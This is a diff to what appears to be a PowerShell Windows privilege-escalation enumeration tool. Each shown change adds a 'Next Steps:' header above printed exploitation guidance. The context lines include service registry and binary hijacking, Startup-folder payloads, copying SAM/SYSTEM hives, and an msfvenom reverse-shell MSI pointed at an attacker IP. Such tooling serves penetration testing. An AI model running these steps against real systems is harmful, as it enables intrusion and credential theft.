@@ -417,6 +417,7 @@ function Check-WeakRegistryPermissions{
     if ($result -eq $true){
         $vulServ = $vulServ -join "`n"
         write-host "  + Possible escalation of privileges" -ForegroundColor green
+        write-host "   Next Steps:"
         write-host "   Vulnerable services based on weak privileges in registry with LocalSystem:"
         write-host "$vulServ"
         write-host "   1. Overwrite the service registration key: reg add HKLM\SYSTEM\CurrentControlSet\Services\[vulnserv] /v ImagePath /t REG_EXPAND_SZ /d [payloadpath] /f"
@@ -474,6 +475,7 @@ function Check-InsecureServicesExecutable{
     # Write method
     if ($result -eq $true){
         write-host "  + Possible escalation of privileges" -ForegroundColor green
+        write-host "   Next Steps:"
         write-host "   Insecure executable services.The function checks that the permissions held by the user or groups to which it belongs through AccesChk are appropriate to exploit this vulnerability."
         write-host "$vulnserv"
         write-host "   1. Copy the payload in the path with the exactly name of the vuln service: copy [payload] [pathvulnserv] /Y"
@@ -598,6 +600,7 @@ function Check-TaskScheduled{
             $message = 'Taskname-TaskCommand: {0} - {1}' -f $_, $vulnservPerm[$_]
             Write-Output $message
         }
+        write-host "   Next Steps:"
         write-host "   1. Obtain the service with the path (careful with env variables): Get-WmiObject win32_service | Select Name, PathName | Where-Object {`$_.pathname -eq `"[TaskCommand]`"} "
         write-host "   2. Check if the service execute with LocalSystem Privs: sc.exe qc [servicename]"
         write-host "   3. Copy the payload in the path with the exactly name of the vuln service: copy [payload] [pathvulnserv] /Y"
@@ -610,6 +613,7 @@ function Check-TaskScheduled{
             $message = 'Taskname-ExecutablePath: {0} - {1}' -f $_, $vulnservUnquoted[$_]
             Write-Output $message
         }
+        write-host "   Next Steps:"
         write-host "   1. Obtain the service with the path (careful with env variables): Get-WmiObject win32_service | Select Name, PathName | Where-Object {`$_.pathname -eq `"[ExecutablePath]`"} "
         write-host "   2. Check if the service execute with LocalSystem Privs: sc.exe qc [servicename]"
         write-host "   3. Check write permissions in the split path folders services: AccChk_TaskUnquotedPath.txt"
@@ -679,6 +683,7 @@ function Check-Autoruns{
     # Write method
     if ($result -eq $true){
         write-host "  + Possible escalation of privileges" -ForegroundColor green
+        write-host "   Next Steps:"
         write-host "   Insecure executable services.The function checks that the permissions held by the user or groups to which it belongs through AccesChk are appropriate to exploit this vulnerability."
         write-host "$servVuln"
         write-host "   1. Copy the payload in the path with the exactly name of the vuln service: copy [payload] [pathvulnserv] /Y"
@@ -722,6 +727,7 @@ function Check-AlwaysInstallElevated {
     # Write method
     if ($result -eq $true){
         write-host "  + Possible escalation of privileges" -ForegroundColor green
+        write-host "   Next Steps:"
         write-host "   AlwaysInstallElevated is activated"
         write-host "   1. Create a reverse shell msi: msfvenom -p windows/x64/shell_reverse_tcp LHOST=[attackerip] LPORT=[attackerport] -f msi -o reverse.msi"
         write-host "   2. Download file in windows and execute: msiexec /quiet /qn /i reverse.msi"
@@ -756,6 +762,7 @@ function Check-InsecureGUIApps{
     # Write method
     if ($result -eq $true){
         write-host "  + Possible escalation of privileges" -ForegroundColor green
+        write-host "   Next Steps:"
         write-host "   Applications running under other users' or SYSTEM privileges: CheckInsecureGUIApps.txt"
         write-host "   1. Check if any user is in Admin group: net user [user]"
         write-host "   2. Execute the program with privs and open file: file://c:/windows/system32/cmd.exe push ENTER"
@@ -782,6 +789,7 @@ function Check-StartUpApps{
     # Write method
     if ($result -eq $true){
         write-host "  + Possible escalation of privileges" -ForegroundColor green
+        write-host "   Next Steps:"
         write-host "   StartUp machine folder is writeable"
         write-host "   1. Generate payload, for example .exe"
         write-host "   2. Download into folder C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
@@ -831,6 +839,7 @@ function Check-PasswordsFilesDir{
     # Write method
     if ($result -eq $true){
         write-host "      + Possible credentials matches found" -ForegroundColor green
+        write-host "   Next Steps:"
         write-host "      1. Check PossiblePasswords.txt section: Files and Directories"
     } else {
         write-host "      |- Nothing found"
@@ -893,6 +902,7 @@ function Check-RegistryPass{
     # Write method
     if ($result -eq $true){
         write-host "      + Possible credentials in registry found" -ForegroundColor green
+        write-host "   Next Steps:"
         write-host "      1. Check PossiblePasswords.txt section: Common credentials in registry"
     } else {
         write-host "      |- Nothing found"
@@ -919,6 +929,7 @@ function Check-RunAsCommand {
     # Write method
     if ($result -eq $true){
         write-host "      + Possible credentials matches found" -ForegroundColor green
+        write-host "   Next Steps:"
         write-host "      1. Check PossiblePasswords.txt section: Credentials Manager"
     } else {
         write-host "      |- Nothing found"
@@ -961,6 +972,7 @@ function Check-PasswordsBackupHives{
     # Write method
     if ($result -eq $true){
         write-host "      + Possible credentials matches found" -ForegroundColor green
+        write-host "   Next Steps:"
         write-host "      1. Copied this files to work machine. It is necessary SYSTEM + SAM"
         write-host $acopi
     } else {
@@ -992,7 +1004,8 @@ function Check-Impersonate {
     [CmdletBinding()]
 	param()
     
-    write-host "   [-] Check impersonate roles"
+    write-host "`n"
+    write-host "[*] Check impersonate roles"
     
     $patternPermissions = "(SeImpersonatePrivilege|SeAssignPrimaryToken)"
     $command = whoami /all
@@ -1003,6 +1016,7 @@ function Check-Impersonate {
     # Write method
     if ($result -eq $true){
         write-host "  + Possible escalation of privileges" -ForegroundColor green
+        write-host "   Next Steps:"
         write-host "   Impersonate priviledges found: SeImpersonatePrivilege oe SeAssignPrimaryToken"
         write-host "   1. Check so machine. "
         write-host "   2. Check whoami /all if the permission is enable "
